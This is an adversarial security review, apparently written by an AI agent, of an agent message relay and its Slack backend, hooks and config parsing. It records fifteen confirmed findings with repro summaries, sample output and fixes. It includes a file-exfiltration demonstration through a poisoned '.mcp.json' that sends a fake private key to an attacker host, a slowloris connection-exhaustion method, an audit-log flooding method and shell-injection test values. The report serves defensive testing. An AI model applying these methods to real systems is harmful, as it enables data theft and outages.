# Round 2 adversarial review

Scope: Slack backend, self-hosted relay (relay.js, relay-audit.js, tls-fetch.js), init hooks, cross-backend behaviour.
Findings are appended as they are confirmed. Scratch scripts: `/tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/`.

## Findings

### R2-01 (medium, CONFIRMED) `RELAY_LEGAL_HOLD=true` (or yes/on/TRUE) silently does nothing: the hold is off and purge/delete run
`relay.js` `loadConfig` sets `legalHold: e.RELAY_LEGAL_HOLD === "1"`. Any other value, including the obvious ones, is accepted without a warning and the relay starts with NO hold. The sibling setting `RELAY_MIN_RETENTION_DAYS` is validated strictly, so the contrast makes it easy to trust the hold. `RELAY_AUDIT_BODIES` has the same exact-match parse (fails the other way round: bodies silently not audited). An empty `RELAY_TLS_CA=` (e.g. from an unset compose variable) likewise silently turns mTLS off (`caPath` falsy) while TLS stays on.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/r1.mjs` starts relays with each value, sends a message, then calls `bridge_admin_purge {p_older_than:"0 seconds"}` and `bridge_admin_delete_agent`. Output:
```
RELAY_LEGAL_HOLD=1    purge: 400 Legal hold is active...   delete: 400 Legal hold is active...
RELAY_LEGAL_HOLD=true purge: 200 1   delete: 200 0
RELAY_LEGAL_HOLD=yes  purge: 200 1   delete: 200 0
RELAY_LEGAL_HOLD=TRUE purge: 200 1   delete: 200 0
RELAY_LEGAL_HOLD=on   purge: 200 1   delete: 200 0
```
Why it matters: legal hold is a compliance control; an operator who believes it is on will have evidence destroyed by the next `purge` cron. Fail-open on a near-miss value.
Fix: parse booleans strictly (`1|true|yes|on` -> true, `0|false|no|off|""` -> false, anything else -> RelayConfigError), print "legal hold: ON" in the startup line, and treat an empty-but-set `RELAY_TLS_CA` as a config error.

### R2-02 (low, CONFIRMED) `bridge_admin_purge` with an absurd interval ends in HTTP 500 `internal error` (RangeError), not a 400
`p_older_than: "99999999999999999999 days"` passes the interval regex, `ms` is ~8.6e27, `new Date(Date.now()-ms).toISOString()` throws `Invalid time value`. Nothing is deleted, but the admin gets a generic 500 and the relay logs an internal error; the audit log gets no `admin.purge` `failed` entry (only `RpcError`s are audited).
Repro: `r1.mjs` ("huge purge"): `500 {"code":"XX000","message":"internal error"}`, stderr `relay: internal error in bridge_admin_purge: Invalid time value`.
Fix: cap the interval (e.g. <= 100 years) and raise a `22007`/`22008` RpcError; audit every failed admin call, not only RpcErrors.

### R2-03 (medium, CONFIRMED) An empty `RELAY_TLS_CA` silently disables mutual TLS; the relay starts with plain server-side TLS and says nothing
`loadConfig` does `const caPath = e.RELAY_TLS_CA?.trim(); if (caPath && !cert) ...; if (caPath) Object.assign(tls, {requestCert, rejectUnauthorized ...})`. `RELAY_TLS_CA=` (empty, which is what `RELAY_TLS_CA=${CA_PATH}` in compose/systemd/k8s yields when the variable is unset) is treated as "not configured". The startup line prints `listening on https://...` in both cases, so nothing tells the operator that client certificates are not required. The only hint of the mode is the URL scheme.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/r3.mjs` (CA and server cert generated with openssl in `pki/`):
```
RELAY_TLS_CA="<ca.pem>"  -> https client without a certificate: ERR_SSL_TLSV13_ALERT_CERTIFICATE_REQUIRED
RELAY_TLS_CA=""          -> https client without a certificate: HTTP 200  (startup line identical)
```
Why it matters: mTLS is the network-level gate for the relay (the only thing between the open network and the token check). The failure is invisible and falls back to the weaker mode. Same family as R2-01.
Fix: treat a set-but-empty `RELAY_TLS_CA`/`RELAY_TLS_CERT`/`RELAY_LEGAL_HOLD` as a config error; print `mTLS: required|off`, `legal hold: on|off`, `retention: N days` in the startup line.

### R2-04 (low, CONFIRMED) Any unauthenticated client can grow the audit log without bound (about 260 bytes per failed request, ~1,900 requests/s from one client)
Every failed agent or admin authentication appends a hash-chained line (`auth_failed`) with a synchronous `writeSync`; there is no throttle, no per-IP limit, no size cap and no rotation (rotation would break the chain, see R2-05). The relay's open-issues note mentions no brute-force throttling, but not that the same path is a disk-fill/audit-flood vector that also buries real events and, once the disk is full, makes later audit writes fail (`audit log write failed` is only logged, requests keep succeeding, so a full disk silently ends auditing).
Repro: `r2.mjs`: `3000 unauthenticated requests in 1616ms -> audit.log 777000 bytes (259 B/req)` (about 40 GB/day). 3000 idle TCP connections were also accepted at once (no connection cap; `/healthz` still answered in 2 ms, so this is only a note).
Why it matters: an unauthenticated attacker with network reach can fill the disk (also the SQLite volume if shared) and then operate with the audit trail silently dead.
Fix: rate-limit/aggregate `auth_failed` (e.g. one line per IP+scope per minute with a counter), fail closed when an audit write fails (refuse the request before committing, as the open-issues note itself suggests), and expose audit-write failures on `/healthz`.

### R2-05 (low, CONFIRMED by simulating the torn line) One short or failed audit write permanently breaks verification of everything written after it
`AuditLog.write` uses `writeSync(fd, line + "\n")`. If the write is cut short (ENOSPC, which R2-04 lets an attacker provoke, or a crash), the file ends in a half line without `\n`. `this.last` is not advanced, and the next entry, or the first entry after a restart, is appended straight onto the partial text, producing one line that is not valid JSON. `verify-audit` then reports `BROKEN at line N: not valid JSON` and cannot get past it, so every later (genuine) entry is unverifiable and a real tamper after that point is indistinguishable from the old break. There is no resync or "repair" path. Restart also reuses the junk line as `prev`.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/r4.mjs`:
```
before: {"ok":true,"lines":2,...}
after partial line + 2 more entries: {"ok":false,"line":3,"reason":"not valid JSON"}
```
Why it matters: the chain is the tamper-evidence feature; a disk-full event (provokable per R2-04) is enough to make the remainder of the log unverifiable and to hide a later edit behind an "already broken" log.
Fix: on open, if the file does not end in `\n`, write a `\n` first and record a `chain.resumed` entry; after a failed `writeSync`, the writer should do the same before its next write; make `verify-audit` able to continue past a broken line and report all breaks.

### R2-06 (low, CONFIRMED) `init --hook` de-duplication deletes the user's own hooks that share a matcher group with an old agent-bridge hook
`cli.js` filters `settings.hooks.UserPromptSubmit` with `.filter((h) => !(h.hooks || []).some((x) => ours.test(text(x))))`. `h` is a whole matcher group (`{matcher?, hooks:[...]}`), so if ANY hook in the group matches, every other hook in that group is dropped too. Claude Code's settings format puts several hooks in one group, and people hand-merge. The regex also matches any command whose text merely contains `cli.js peek <name>`.
Repro: `bash /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/h1.sh` writes a group `[ {echo my-own-hook-that-must-survive}, {node /old/cli.js peek frontend} ]`, runs `init <repo> frontend --hook`, and the result contains only the new agent-bridge hook; the `echo my-own-hook...` entry is gone, with no message.
Why it matters: silent loss of user configuration (security hooks, linters) in `.claude/settings.local.json`.
Fix: filter the hooks inside each group (`h.hooks = h.hooks.filter(x => !ours.test(...))`) and only drop the group if it ends up empty.

### R2-07 (medium, CONFIRMED) Slack: 4,100 junk posts in the channel make every unread request to every agent disappear (silent message loss and thread denial); Slack also has none of the R1-03 sender limits
`SlackStore.scan()` reads at most 20 pages x 200 messages of `conversations.history`, newest first, and silently ignores the rest. Anything older than the 4,000 newest channel messages is invisible to `inbox`, `unreadSummary`, `thread`, `recent` and to the thread-rule logic (a reply whose hop-1 start fell off the page is dropped as "start not seen"). The junk does not have to be bridge traffic: plain text from any member counts. No error or warning is produced; `check_inbox` just says "Inbox empty". Slack also has no per-sender rate, unread-backlog or byte limit (R1-03 was fixed on SQLite, Supabase and the relay only), so one looping or compromised agent can do this by itself (Slack's own ~1 post/s/channel limit means about 70 minutes, well inside the 72 h lookback).
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/s1.mjs` (fake Slack):
```
bob unread before flood: [ { from_agent: 'alice', n: 1 } ]
bob unread after 4100 plain-text posts: []   inbox: 0
```
Why it matters: loss of requests with no signal, and a cheap way for any channel member to blind all agents; it also defeats the loop-cap logic because starts vanish.
Fix: page until `oldest` is reached (or until `has_more` is false) with a bounded but much higher page cap, and return an explicit error ("channel too busy, N messages not scanned") when the cap is hit; add receiver-side limits (ignore senders with more than N unread to you, rate cap per sender per minute) so Slack gets the R1-03 protections.

### R2-08 (low, CONFIRMED) Slack: two channel members with the same Slack username are both read as the same `human:<name>`; only sending to them is guarded
`parseHumanMessage` attributes a post to `human:${u.name}` without checking `dir.humansByName.get(u.name).length === 1` (bots get that check in `agentNameOf`, and `send` refuses ambiguous humans). Slack's `user.name` is a legacy handle that is not guaranteed unique per person, and the claim in the docs is only that duplicate BOT names are trusted by nobody.
Repro: `s1.mjs` part 3: after `b.addHuman("dana")` twice, a post by the second dana arrives at bob as `from_agent: 'human:dana'`; `send({to:"human:dana"})` is refused with `Unknown person "human:dana"`.
Why it matters: an agent that treats `human:dana` as a particular trusted person (the instructions tell it these are peers, not the user, but people do build on names) can be addressed by a lookalike. Low because humans are untrusted by design.
Fix: apply the same uniqueness rule to humans (drop or label `human:dana?` when `humansByName` has more than one id), or use the user id in the sender name.

### R2-09 (medium, CONFIRMED) `bridge_admin_export`: a timestamp without a zone designator is read in the relay host's local time zone, so an export range silently shifts and returns messages outside the requested range
`COERCE.timestamp` does `Date.parse(v)` on anything starting `YYYY-MM-DD`. For a date-time without `Z`/offset (`2026-11-19T18:16:10`), V8 uses the process's local zone, so the range depends on the `TZ` of the relay host (and the CLI help says `--from ISO`, which people write without `Z`). Date-only values are UTC, which makes the two forms differ by the zone offset.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/e1.mjs` (sends one message, exports with `p_to` = 1 hour before it, written as UTC wall-clock without zone):
```
TZ=UTC:                 message at 2026-11-19T19:16:10.258Z; export p_to=2026-11-19T18:16:10 (1h before) returned 0 message(s)
TZ=America/Los_Angeles: message at 2026-11-19T19:16:10.351Z; export p_to=2026-11-19T18:16:10 (1h before) returned 1 message(s)
```
Why it matters: the export is the regulator-facing evidence path; it returns data from outside the requested window (a disclosure beyond scope, and an incomplete export in the other direction), and the audit entry `auditor.export` records only the already-converted instant so the discrepancy is not visible later.
Fix: require an explicit `Z`/offset (reject zone-less date-times with 22007) or parse them as UTC explicitly; log the original string next to the normalised one.

### R2-10 (low, CONFIRMED) A stale `RELAY_ADMIN_KEY` in the environment silently outranks `RELAY_ADMIN_KEY_FILE`, so a "rotated" admin key keeps the old one alive
`readKey` takes the environment variable first and only reads `*_FILE` when the variable is empty (the `--admin-key-file` flag is the one exception, it deletes the env var). The same holds for `RELAY_AUDITOR_KEY`. With both set (a left-over `Environment=` line, a compose `.env`), replacing the key file as the README's rotation recipe says leaves the old key valid and the new one rejected, with no warning.
Repro: `node .../adversary2/k1.mjs` -> `rotated key (in RELAY_ADMIN_KEY_FILE): 401  stale RELAY_ADMIN_KEY from env still accepted: 200`.
Fix: refuse to start when both the variable and the `_FILE` are set (or at least print which source won), for the admin and auditor keys.

### R2-11 (low, CONFIRMED mechanism; the precondition is SUSPECTED) Any readable file can be sent to the configured backend URL as the "token": a changed `.mcp.json` `env` block turns the server into a file exfiltration tool
`readSecret` reads whatever file `AGENT_BRIDGE_TOKEN_FILE` / `SLACK_BOT_TOKEN_FILE` names and `SupabaseStore`/`SlackStore` send it, unvalidated, to `RELAY_URL` / `SUPABASE_URL` / `SLACK_API_URL`, over plain `http://` if that is what the URL says. The `peek` code comment already makes this argument for the hook ("a changed .mcp.json could otherwise send this agent's token to another host"), but the MCP server itself reads the same `.mcp.json` env, and `.mcp.json` is the file `init` tells people to commit. If Claude Code's approval of a project server is keyed by the server name (my reading of its behaviour, not verified here), a later commit that edits only the `env` of the already-approved `bridge` server redirects the token file, or any other file the user can read, to an attacker's host.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/x1.mjs` creates a fake private key file, builds the env a poisoned `.mcp.json` would give the server (`AGENT_BRIDGE_BACKEND=relay`, `RELAY_URL=http://127.0.0.1:<attacker>`, `AGENT_BRIDGE_TOKEN_FILE=<key file>`), calls `createStore(...).identify()`; the "attacker" receives:
```
{"p_token":"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA-not-a-bridge-token-AAAA\n-----END OPENSSH PRIVATE KEY-----"}
```
Why it matters: it widens the blast radius of a poisoned `.mcp.json` from "the bridge token" to "any file readable by the user", and the same hole exists in the exec/shell hook for values from `settings.local.json`.
Fix: check the secret's shape before use (`^abt_[0-9a-f]{64}$` for Supabase/relay, `^xoxb-[A-Za-z0-9-]+$` for Slack, the same patterns `save-token` and `save-slack-token` already enforce), refuse non-loopback `http://` URLs for agent calls, and optionally require token files to live under `~/.agent-bridge/`.

### R2-12 (low, CONFIRMED) Exec-form hook drops `NODE_EXTRA_CA_CERTS`, so for a relay with a private CA (the documented setup) the unread-mail hook fails silently
`init --relay` copies `NODE_EXTRA_CA_CERTS` into `.mcp.json`, and the shell-form hook carries it as an env prefix, but the exec-form hook only passes `PEEK_ENV_KEYS` via `--set`, and `NODE_EXTRA_CA_CERTS` is not in the set (it could not work anyway: Node reads it at process start, not from `process.env` later). `peek` swallows every error, so on Windows (exec is the default there) the hook just never reports unread mail and nothing says why. Not a confidentiality bug, but the same silent-degradation class as R2-01/R2-03, and the test suite only checks the shell form for the CA.
Repro: `NODE_EXTRA_CA_CERTS=/etc/ssl/my-ca.pem RELAY_URL=https://bridge.internal:8787 node cli.js init <repo> fe --relay --hook --hook-form shell|exec` (token file present): the `shell` settings contain `NODE_EXTRA_CA_CERTS='/etc/ssl/my-ca.pem'`; the `exec` settings do not mention it, only `.mcp.json` does.
Fix: for exec form, make `peek` re-spawn itself with `NODE_EXTRA_CA_CERTS` set from `--set`, or have init warn that exec hooks need `RELAY_TLS_CA` instead (which `tlsFetch` does honour and `PEEK_ENV_KEYS` allows).

### R2-13 (low, CONFIRMED) An unauthenticated request with a deeply nested argument value gets HTTP 500 `internal error` (stack overflow in the error formatter)
`typeError()` calls `JSON.stringify(v)` on the offending value to build the message; for a 120,000-level nested array `JSON.stringify` throws `RangeError`, which is not an `RpcError`, so the client gets a 500 and the relay logs an internal error, before any authentication. The relay does not crash, but this contradicts "unknown or bad arguments are 4xx", and gives anyone a way to fill the stderr log with "internal error" lines and to distinguish bodies by status. Same family as R2-02.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/n1.mjs`:
```
500 {"code":"XX000","message":"internal error",...}      (stderr: relay: internal error in bridge_whoami: Maximum call stack size exceeded)
shallow: 400 {"code":"22P02","message":"invalid input syntax for type text: [1]",...}
```
Fix: build the message from `typeof v` / `Array.isArray(v)` (no stringify of attacker data), or wrap in try/catch; reject nesting deeper than a few levels after `JSON.parse`.

### R2-14 (low, CONFIRMED) The audit log does not record `bridge_recent`, and `peek` records only a count, so message bodies can be read without an audit trail
The relay's audit promises a record of what was delivered (`deliver` per message, `thread`, `peek`). `bridge_recent` returns full bodies of every message the caller sent or received, read or not, and writes nothing. A `bridge_inbox` with `p_mark_read:false` (what `wait_for_message` does first, and what a hook-less client can loop on) is logged as `peek` with a count and no message ids, so the log cannot say which messages were disclosed.
Repro: `node /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/au.mjs`:
```
bridge_recent returned 1 message body: secret-1 | peek returned 1
audit entries added by those two reads: [ { action: 'peek', agent: 'bb', count: 1, id: undefined } ]
```
Why it matters: a token holder can re-read the whole history (up to 200 messages per call, repeatedly) through `bridge_recent` invisibly, which defeats the point of an audit log in the regulated deployments this relay targets.
Fix: audit `recent` (agent, count, first/last id) and put the ids in `peek` entries.

### R2-15 (medium, CONFIRMED) Slowloris: connections that stop sending in the middle of the request headers (or never send anything) are never closed, and there is no connection cap
`headersTimeout = 15 s` / `requestTimeout = 30 s` do not reap a socket that sent a partial header block and then went quiet, nor one that connected and sent nothing; `server.timeout` is left at Node's default 0 and `maxConnections` is unset. Measured on Node 22.23.5: a body that stalls after the headers is closed at 30 s (408), but a half-sent header block, an idle connection and a single byte were all still open at 130 s (only a client that keeps dripping header bytes was cut, at 40 s). Any client with network reach (the port is open by design for the whole agent fleet) can therefore hold every file descriptor of the relay for as long as it likes, without sending a valid request or a credential, and the relay then fails all requests (including the compose/Docker health probe).
Repro: `bash /tmp/claude-0/-home-user-a/f9407917-d4b1-5c0a-a481-0ad006f6aa8a/scratchpad/adversary2/d2.sh` (relay under `ulimit -n 256`, 300 connections each sending `POST ... HTTP/1.1\r\nHost: x\r\n` and nothing more):
```
partial-header connections held open: 235
healthz while held: FAILED UND_ERR_SOCKET
healthz after release: 200
```
(`m3.mjs` shows the 130 s / 75 s hold times; `r2.mjs` opened 3,000 idle connections without trouble because this sandbox allows 20,000 fds. Real hosts often default to 1,024.)
Why it matters: a one-machine, no-credential outage of the message bus, which the docs treat as only "a 32 character key is the defence".
Fix: `server.maxConnections`, a socket idle timeout (`server.setTimeout(30_000)` or `socket.setTimeout` in a `connection` handler that destroys the socket), and `server.connectionsCheckingInterval` lowered; say in relay/README.md to put the relay behind a proxy that does this.

## Tried and held

Relay
- Key confusion matrix (`m1.mjs`): agent token or auditor key on admin functions -> 401; admin key or agent token on `bridge_admin_export` -> 401; admin/auditor key as `p_token` -> 403; duplicated `apikey` header -> 401; auditor key works only for export.
- Argument fuzz (`f1.mjs`): 1,258 calls (35 hostile values x every argument of all 15 functions: huge/negative/float/NUL/lone surrogate/`__proto__`/arrays/objects/uuids/intervals/timestamps). The only 5xx were the two interval/nesting cases in R2-02 and R2-13; no crash, no stack or SQL text on the wire.
- Legal hold and retention with the exact value `1`: `purge` and `delete-agent` refuse, including `delete-agent` for an agent with only old messages when a hold is on. No other code path deletes or rewrites message rows (inbox/unmark only change `read_at`, as intended; revoke/rotate touch only `relay_agents`).
- Body limit (413 with early `Content-Length` and with chunked bodies), non-object JSON, 120,000-deep nested array body (400), unknown/extra arguments (404 PGRST202), `/healthz` content, 3,000 concurrent idle sockets (healthz still 2 ms; see R2-15 for the real limit), slow body (408 at 30 s).
- SQLite file, `-wal`, `-shm` and the audit log are 0600 even in a 0755 directory; a pre-existing 0644 database is tightened. Admin key comparison is constant time on digests; no length oracle.
- mTLS with a CA set: a client without a certificate fails the handshake (TLSv1.3 `certificate required`); server `minVersion` TLS 1.2; client `tlsFetch` verifies hostname and never follows redirects (the store refuses any 3xx).
- Audit chain: edit, delete, reorder of any non-final line is caught at the first affected line. An attacker with write access to the file who recomputes the whole chain gets `OK` with a different final hash (`fg.mjs`), as the docs say: it is only detectable against an externally recorded last hash, and deleting the file entirely verifies as "OK (0 lines)" and the relay then starts a new chain from the genesis value.
- `p_older_than` parsing: negative, exponent and multi-unit strings are rejected; retention comparison uses the same millisecond value as the cutoff.
- Export: `p_after_id`/`p_limit` clamps hold, `p_to` is exclusive, `p_from` inclusive, the auditor cannot reach agent calls (zone problem is R2-09).

Hooks
- Shell form with hostile values (`RELAY_URL` containing `'$(...)'`, backticks and `;`, `NODE_EXTRA_CA_CERTS` with spaces and `$(...)`): the hook ran and the marker file was not created. `peek --set` refuses every key outside `PEEK_ENV_KEYS` (`AGENT_BRIDGE_TOKEN`, `NODE_OPTIONS` tested). The de-dup regex is built from an already validated agent name, so it has no metacharacters, and `name` vs `name-2` is not confused (`(\s|$)`).
- `peek` prints only counts and sender names; sender names are validated on every backend (`human:<[a-z0-9._-]>` on Slack), so the hook cannot carry injected text.

Slack
- Sender identity (metadata `from`, `username` override, forged `to`/`hop`/`type`/`v`), reply hijack by a non-participant, hop numbers above the thread's cap, cap above 100, reply before start: all dropped by readers, as `test/slack.js` claims and as I re-checked with the fake.
- Duplicate bot names: neither bot is trusted for sending, receiving or `@name`/`<@ID>` addressing. A bot that is not a channel member is ignored. A bot message without metadata is never treated as a human. A human's post with metadata is not treated as an agent message.
- Escaping: `<!channel>`, `<@U..>`, `<https://x|y>` in body and subject are escaped; `&amp;lt;` round-trips; header fields are validated names/timestamps.
- Claim: the ✅ only counts when added by the receiving bot itself (another member's ✅ does not mark a message read); `already_reacted` yields exactly one claimant. `postMessage` and `reactions.add` are not retried.
- String comparison of Slack timestamps (`thread > m.ts`, `id > afterId`) is only wrong for 9- or 11-digit ids, which cannot exist as thread starts.

Cross-backend
- Hop caps, two-participant threads, and per-thread cap are enforced by the store on SQLite, Supabase and relay, and by each reader on Slack. Identity comes from the token (Supabase, relay) or the bot user (Slack); only SQLite trusts `AGENT_NAME`, as documented.
- Differences noted but not security relevant: SQLite queues mail for unknown agents while Supabase/relay refuse; relay lower-cases thread ids, SQLite does not; `p_limit` 0 clamps to 1 on the relay and to the default on SQLite.

## Summary

| id | severity | status | title |
|---|---|---|---|
| R2-01 | medium | CONFIRMED | `RELAY_LEGAL_HOLD=true/yes/on` silently leaves the hold off (purge and delete-agent run) |
| R2-02 | low | CONFIRMED | `bridge_admin_purge` with a huge interval is an unaudited HTTP 500 |
| R2-03 | medium | CONFIRMED | Empty `RELAY_TLS_CA` silently disables mutual TLS |
| R2-04 | low | CONFIRMED | Unauthenticated requests grow the audit log without bound (~260 B each) |
| R2-05 | low | CONFIRMED | One torn audit write makes all later entries unverifiable |
| R2-06 | low | CONFIRMED | `init --hook` de-dup deletes the user's other hooks in the same group |
| R2-07 | medium | CONFIRMED | Slack: 4,100 junk posts hide every older unread message; no sender limits on Slack |
| R2-08 | low | CONFIRMED | Slack: two humans with the same username are both `human:<name>` |
| R2-09 | medium | CONFIRMED | Export range: zone-less timestamps use the server's time zone and leak/miss messages |
| R2-10 | low | CONFIRMED | Stale `RELAY_ADMIN_KEY` env outranks the rotated key file |
| R2-11 | low | CONFIRMED (precondition suspected) | Any readable file is sent as the "token" to the configured URL (poisoned `.mcp.json`) |
| R2-12 | low | CONFIRMED | Exec-form hook drops `NODE_EXTRA_CA_CERTS`; relay hook fails silently with a private CA |
| R2-13 | low | CONFIRMED | Deeply nested argument gives an unauthenticated HTTP 500 |
| R2-14 | low | CONFIRMED | `bridge_recent` and `peek` leave no usable audit record of disclosed messages |
| R2-15 | medium | CONFIRMED | Slowloris: half-open and idle connections are never reaped; no connection cap |

Counts: 0 critical, 0 high, 5 medium, 10 low (15 total, all confirmed by running something).
